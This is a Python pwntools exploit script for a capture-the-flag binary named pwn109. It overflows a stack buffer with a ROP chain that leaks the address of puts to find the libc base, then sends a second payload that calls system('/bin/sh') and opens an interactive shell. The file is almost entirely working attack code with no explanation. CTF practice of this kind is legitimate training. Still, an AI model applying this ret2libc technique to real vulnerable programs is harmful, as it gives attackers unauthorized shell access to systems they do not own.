#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwn109-1644300507645.pwn109_patched")
libc = ELF("./libc.so.6")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

pop_rdi_ret = 0x00000000004012a3
pop_rsi_r15_ret = 0x00000000004012a1
def main():
    r = conn()
    gdb.attach(r, """
    b *main +63
    c
    """)
    r.recv()
    payload = flat(
        "A" * 32,
        "B" * 8,
        p64(pop_rdi_ret),
        p64(exe.got['puts']),
        p64(exe.plt['puts']),
        p64(exe.symbols['main'])
        )
    

    r.sendline(payload)
    puts_leak = int(r.recvline().strip()[::-1].hex(), 16)
    print(hex(puts_leak))
    libc_base = puts_leak - libc.symbols['puts']
    libc.address = libc_base
    log.info(f"Libc base: {hex(libc_base)}")
    libc_rop = ROP(libc)

    payload2 = flat(
        "A" * 32,
        "B" * 8,
        p64(pop_rdi_ret),
        next(libc.search(b"/bin/sh\0")),
        p64(ROP(exe).find_gadget(['ret'])[0]),
        p64(libc.symbols['system'])



    )
    r.sendline(payload2)   
    # print(libc_leak, int(libc_leak, 16))

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
